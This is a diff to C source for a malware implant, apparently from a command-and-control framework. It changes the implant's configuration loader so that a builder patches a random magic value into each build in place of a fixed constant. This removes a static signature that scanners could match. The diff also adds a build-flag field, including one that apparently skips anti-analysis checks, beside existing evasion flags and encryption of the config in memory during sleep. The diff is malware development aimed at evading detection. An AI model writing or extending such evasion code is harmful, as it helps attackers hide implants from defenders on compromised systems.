@@ -19,6 +19,27 @@
 
 static IMPLANT_CONFIG g_config;
 
+/* ================================================================== */
+/*  Per-build config magic — patchable by builder                      */
+/* ================================================================== */
+
+/*
+ * The builder scans for "SPECCFGM" (8 bytes) followed by 4 zero bytes,
+ * writes the per-build random magic into those 4 bytes, then scrubs the
+ * marker prefix to random data. At runtime, only the 4-byte magic
+ * value at offset 8 remains meaningful.
+ *
+ * Layout before builder:  ['S','P','E','C','C','F','G','M', 0,0,0,0]
+ * Layout after builder:   [random 8 bytes] [magic: u32 LE]
+ */
+static volatile const BYTE cfg_magic_marker[12] = {
+    'S','P','E','C','C','F','G','M', 0x00, 0x00, 0x00, 0x00
+};
+
+DWORD cfg_get_magic(void) {
+    return *(const DWORD *)(cfg_magic_marker + 8);
+}
+
 /* In-memory encryption state (used during sleep) */
 static BYTE g_cfg_enc_buf[sizeof(IMPLANT_CONFIG)];
 static BYTE g_cfg_enc_nonce[AEAD_NONCE_SIZE];
@@ -91,10 +112,11 @@ static void cfg_derive_key(PVOID pic_base, BYTE key_out[32]) {
 static CONFIG_BLOB_HEADER *cfg_find_blob(PVOID pic_base) {
     BYTE *p = (BYTE *)pic_base;
     DWORD limit = CONFIG_SCAN_MAX - sizeof(CONFIG_BLOB_HEADER);
+    DWORD magic = cfg_get_magic();
 
     for (DWORD i = CONFIG_SCAN_START; i < limit; i += 4) {
         DWORD val = *(DWORD *)(p + i);
-        if (val == CONFIG_MAGIC) {
+        if (val == magic) {
             CONFIG_BLOB_HEADER *hdr = (CONFIG_BLOB_HEADER *)(p + i);
             if (hdr->version == CONFIG_VERSION &&
                 hdr->data_size > 0 &&
@@ -252,6 +274,7 @@ NTSTATUS cfg_update(IMPLANT_CONTEXT *ctx, const BYTE *data, DWORD len) {
 #define CFG_TLV_PROFILE_BLOB        0x87
 #define CFG_TLV_EVASION_FLAGS       0x88
 #define CFG_TLV_IMPLANT_PUBKEY      0x89
+#define CFG_TLV_BUILD_FLAGS         0x8A
 
 static NTSTATUS cfg_patch_tlv(IMPLANT_CONFIG *cfg, const BYTE *data, DWORD len) {
     DWORD pos = 0;
@@ -388,6 +411,12 @@ static NTSTATUS cfg_patch_tlv(IMPLANT_CONFIG *cfg, const BYTE *data, DWORD len) 
                 cfg->evasion_flags = *(const DWORD *)val;
             else if (vlen >= 1)
                 cfg->evasion_flags = (DWORD)val[0];
+            break;
+
+        case CFG_TLV_BUILD_FLAGS:
+            /* Builder sends 1 byte bitfield: 0x01=debug, 0x02=skip_aa */
+            if (vlen >= 1)
+                cfg->build_flags = (DWORD)val[0];
             break;
 
         default:
